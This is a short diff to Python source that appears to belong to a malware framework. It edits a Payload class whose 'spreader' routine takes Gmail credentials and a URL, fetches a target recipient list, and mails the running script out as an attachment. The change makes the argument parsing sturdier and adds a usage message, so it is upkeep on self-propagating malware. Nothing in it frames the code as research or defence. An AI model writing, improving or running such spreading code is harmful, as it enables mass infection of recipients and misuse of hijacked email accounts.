@@ -8,6 +8,7 @@ import sys
 import time
 import json
 import errno
+import shlex
 import base64
 import ctypes
 import ftplib
@@ -1166,7 +1167,10 @@ class Payload():
             self.load('spreader')
         try:
             attachment = sys.argv[0]
-            gmail, password, url = args.split()
+            try:
+                gmail, password, url = shlex.split(args)
+            except:
+                return 'invalid paramters to spread\n\trequires exactly 3 args: <email> <password> <targets>'
 
             try:
                 recipients = urlopen(url).read().splitlines()
